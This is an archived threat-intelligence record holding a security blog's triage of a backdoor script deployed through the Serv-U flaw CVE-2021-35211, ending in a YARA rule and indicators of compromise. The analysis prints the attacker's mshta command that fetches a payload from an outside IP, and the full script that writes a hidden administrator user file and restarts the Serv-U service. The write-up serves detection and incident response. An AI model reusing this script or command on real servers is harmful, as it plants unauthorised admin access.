{
    "id": "5f0334c4-f473-4041-afd3-78c6ed00bb68",
    "created_at": "2023-01-12T15:10:32.216475Z",
    "updated_at": "2025-03-27T02:11:51.892042Z",
    "deleted_at": null,
    "sha1_hash": "ff1e351f698c4a2368d694a4e37afc924bc295c3",
    "title": "2021-07-14 - Triage analysis of Serv-U FTP user backdoor deployed by CVE-2021-35211 (DEV-0322)",
    "authors": "",
    "file_creation_date": "2022-05-27T23:23:00Z",
    "file_modification_date": "2022-05-27T23:23:00Z",
    "file_size": 778694,
    "plain_text": "# Triage analysis of Serv-U FTP user backdoor deployed by CVE-2021-35211\n\n**[cadosecurity.com/post/triage-analysis-of-serv-u-ftp-user-backdoor-deployed-by-cve-2021-35211](https://www.cadosecurity.com/post/triage-analysis-of-serv-u-ftp-user-backdoor-deployed-by-cve-2021-35211)**\n\n## Blog\n\n July 14, 2021\n\n\nJuly 14, 2021\n\n\n## Last night, Microsoft published a blog titled Microsoft discovers threat actor targeting SolarWinds Serv-U software with 0-day exploit:\n\n “MSTIC has observed DEV-0322 targeting entities in the US Defense Industrial Base Sector and software companies …. This activity group is based in China and has been observed using commercial VPN solutions and compromised consumer routers in their attacker infrastructure.”\n\n One of the malicious commands the attacker ran that Microsoft shared is:\n```\nC:\\Windows\\System32\\mshta.exe http://144[.]34[.]179[.]162/a\n\n We took a very quick look at the file 8785f1049eed4f837e634bf61468e6db921368b61ef5c8b4afa03f44465bd3e0 – served from http://144.34.179[.] 162/a – below.\n\n The server is down now, but was previously serving over port 80 from an Apache web-server set to the Chinese language:\nHTTP/1.1 403 Forbidden\nDate: Sat, 26 Jun 2021 13:48:06 GMT\nServer: Apache/2.4.37 (centos)\nContent-Location: index.html.zh-CN\nVary: negotiate,accept-language\nTCN: choice\nLast-Modified: Fri, 14 Jun 2019 03:37:43 GMT\nETag: \"fa6-58b405e7d6fc0;5c336bc7f4d1f\"\nAccept-Ranges: bytes\nContent-Length: 4006\nContent-Type: text/html; charset=UTF-8\nContent-Language: zh-cn\n\n```\n\n-----\n\n## And the script served is a relatively simple one:\n```\n<html>\n<head>\n  <script>\n    try { \n      var sFolderPath = \"C:\\\\ProgramData\\\\RhinoSoft\\\\Serv-U\\\\Users\\\\Global Users\";\n      var fso0 = new ActiveXObject('Scripting.FileSystemObject');\n      if (!fso0.FolderExists(sFolderPath)) {\n          fso0.CreateFolder(sFolderPath);    \n      }\n      var fso;\n      var data = \">>> VERSION 2\n<<<\\r\\nCUser\\r\\nUser\\r\\n0\\r\\n0\\r\\n14\\r\\nCRhinoDateTimeAttr\\r\\nStatisticsStartTime\\r\\n1\\r\\n1\\r\\nVal\\r\\n1622098423\\r\\n<<StatisticsStartTime\\r\\nCRhinoUlongLongAttr\\r\\nRtServerStartTime\\r\\n1\\r\\n1\\r\\nVal\\r\\n1622075299\\r\\n<<RtServerStartTime\\r\\nCDailyCount\\r\\nRtDailyCount\\r\\n1\\r\\n0\\r\\n25\\r\\nCRhinoUintAttr\\r\\nLastHour\\r\\n1\\r\\n1\\r\\nVal\\r\\n6\\r\\n<<LastHour\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<HourTotal\\r\\nCRhinoUlongLongAttr\\r\\nHourTotal\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<- HourTotal\\r\\n<<RtDailyCount\\r\\nCRhinoFileNameStringAttr\\r\\nLoginID\\r\\n1\\r\\n1\\r\\nVal\\r\\ntory\\r\\n<<LoginID\\r\\nCRhinoDateTimeAttr\\r\\nPasswordChangedOn\\r\\n1\\r\\n1\\r\\nVal\\r\\n1622098423\\r\\n<<PasswordChangedOn\\r\\nCRhinoUintAttr\\r\\nPasswordEncryptMode\\r\\n1\\r\\n1\\r\\nVal\\r\\n1\\r\\n<<PasswordEncryptMode\\r\\nCRhinoBoolAttr\\r\\nPasswordUTF8\\r\\n1\\r\\n1\\r\\nVal\\r\\n1\\r\\n<<PasswordUTF8\\r\\nCUserPasswordAttr\\r\\nPassword\\r\\n1\\r\\n1\\r\\nVal\\r\\n00:DDAC510D6348F0D1CA9D169BF3835DCE1EC5A7AE344964F2DA75399\n Password\\r\\nCDirAccess\\r\\nDirAccess\\r\\n0\\r\\n0\\r\\n2\\r\\nCDirFileAccessPathAttr\\r\\nDir\\r\\n1\\r\\n1\\r\\nVal\\r\\n\\\\\\\\\\r\\n<<Dir\\r\\nCRhinoUintAttr\\r\\nAccess\\r\\n1\\r\\n1\\r\\nVal\\r\\n7999\\r\\n<<- Access\\r\\n<<DirAccess\\r\\nCDirPathAttr\\r\\nHomeDir\\r\\n0\\r\\n1\\r\\nVal\\r\\n\\\\\\\\\\r\\n<<HomeDir\\r\\nCRhinoUintAttr\\r\\nAdminType\\r\\n0\\r\\n1\\r\\nVal\\r\\n2\\r\\n<<AdminType\\r\\nCRhinoBoolAttr\\r\\nLockInHomeDir\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<LockInHomeDir\\r\\nCRhinoUlongLongAttr\\r\\nQuota\\r\\n0\\r\\n1\\r\\nVal\\r\\n0\\r\\n<<Quota\\r\\nCRhinoBoolAttr\\r\\nIncludeRespCodesInMsgFiles\\r\\n0\\r\\n1\\r\\nVal\\r\\n1\\r\\n<<- IncludeRespCodesInMsgFiles\\r\\n<<User\\r\\n\";\n      fso=new ActiveXObject(\"Scripting.FileSystemObject\"); \n      var fhandle = fso.createtextfile(\"C:\\\\ProgramData\\\\RhinoSoft\\\\Serv-U\\\\Users\\\\Global Users\\\\tory.Archive\",true);\n      fhandle.write(data);\n      fhandle.close()\n    } catch (e) { \n    } \n    var sleep = function(time) {\n      var startTime = new Date().getTime() + parseInt(time, 10);\n      while(new Date().getTime() < startTime) {}\n    };\n    s = new ActiveXObject(\"WScript.Shell\");\n    s.run(\"\\\"C:\\\\Program Files\\\\RhinoSoft\\\\Serv-U\\\\Serv-U-Tray.exe\\\" -stopengine\",0)\n    sleep(1000)\n    s.run(\"\\\"C:\\\\Program Files\\\\RhinoSoft\\\\Serv-U\\\\Serv-U.exe\\\" -startservice\",0)\n    window.close();\n  </script>\n</head>\n</html>\n\n The script is very simple- it just creates a new user with the following settings:\n\n```\n\n-----\n\n## Set user creation date to: Thu May 27 2021 06:53:43 GMT 0000 (Unix timestamp of 1622098423) Password Hash: DDAC510D6348F0D1CA9D169BF3835DCE1EC5A7AE344964F2DA753991D34C015DEB91B64437A9C99A2AE8EC3CD850694F\n\n Based on the filename, we believe this user created is called “tory” however we haven’t tested this on a live Serv-U installation.\n\n Yara Rule\n```\nrule Malware_ServU_User_Installer {\n  meta:\n   description = \"Detects malicious script deployed via CVE-2021-35211\"\n   author = \"[email protected]\"\n   date = \"2021-07-14\"\n   hash = \"8785f1049eed4f837e634bf61468e6db921368b61ef5c8b4afa03f44465bd3e0\"\n   license = \"Apache License 2.0\"\n  strings:\n    $ = \"<script>\"\n    $ = \"Scripting.FileSystemObject\"\n    $ = \"Global Users\"\n    $ = \"RhinoDateTimeAttr\"\n    $ = \"Serv-U-Tray.exe\"\n    $ = \"WScript.Shell\"\n  condition:\n    all of them and filesize < 300KB\n}\n\n File Hash 8785f1049eed4f837e634bf61468e6db921368b61ef5c8b4afa03f44465bd3e0\n\n Indicators of Compromise (from Microsoft) 98[.]176[.]196[.]89 68[.]235[.]178[.]32 208[.]113[.]35[.]58 144[.]34[.]179[.]162 97[.]77[.]97[.]58 hxxp://144[.]34[.]179[.]162/a C:\\Windows\\Temp\\Serv-U.bat C:\\Windows\\Temp\\test\\current.dmp\n\n References\n\n About Cado Security Cado Security specialises in providing tooling and techniques that allow organisations to threat hunt and investigate cloud and container systems.\n\n If you are interested in knowing more, please don’t hesitate to reach out, our pilot program is now open.\n\n```\n\n-----\n\n## About The Author\n\n Chris Doman\n\n Chris is well known for building the popular threat intelligence portal ThreatCrowd, which subsequently merged into the AlienVault Open Threat Exchange, later acquired by AT&T. Chris is an industry leading threat researcher and has published a number of widely read articles and papers on targeted cyber attacks. His research on topics such as the North Korean government’s crypto-currency theft schemes, and China’s attacks against dissident websites, have been widely discussed in the media. He has also given interviews to print, radio and TV such as CNN and BBC News.\n\n About Cado Security\n\n Cado Security provides the cloud investigation platform that empowers security teams to respond to threats at cloud speed. By automating data capture and processing across cloud and container environments, Cado Response effortlessly delivers forensic-level detail and unprecedented context to simplify cloud investigation and response. Backed by Blossom Capital and Ten Eleven Ventures, Cado Security has offices in the United States and United Kingdom. For more information, please visit https://www.cadosecurity.com/ or follow us on Twitter @cadosecurity.\n\n Prev Post Next Post\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-14 - Triage analysis of Serv-U FTP user backdoor deployed by CVE-2021-35211 (DEV-0322).pdf"
    ],
    "report_names": [
        "2021-07-14 - Triage analysis of Serv-U FTP user backdoor deployed by CVE-2021-35211 (DEV-0322).pdf"
    ],
    "threat_actors": [
        {
            "id": "0a80df4d-5ab7-4ca3-809d-8ef7b5a54f1f",
            "created_at": "2023-11-21T02:00:07.386886Z",
            "updated_at": "2025-03-27T02:00:03.248375Z",
            "deleted_at": null,
            "main_name": "TiltedTemple",
            "aliases": [
                "DEV-0322",
                "Circle Typhoon"
            ],
            "source_name": "MISPGALAXY:TiltedTemple",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536232,
    "ts_updated_at": 1743041511,
    "ts_creation_date": 1653693780,
    "ts_modification_date": 1653693780,
    "files": {
        "pdf": "https://archive.orkl.eu/ff1e351f698c4a2368d694a4e37afc924bc295c3.pdf",
        "text": "https://archive.orkl.eu/ff1e351f698c4a2368d694a4e37afc924bc295c3.txt",
        "img": "https://archive.orkl.eu/ff1e351f698c4a2368d694a4e37afc924bc295c3.jpg"
    }
}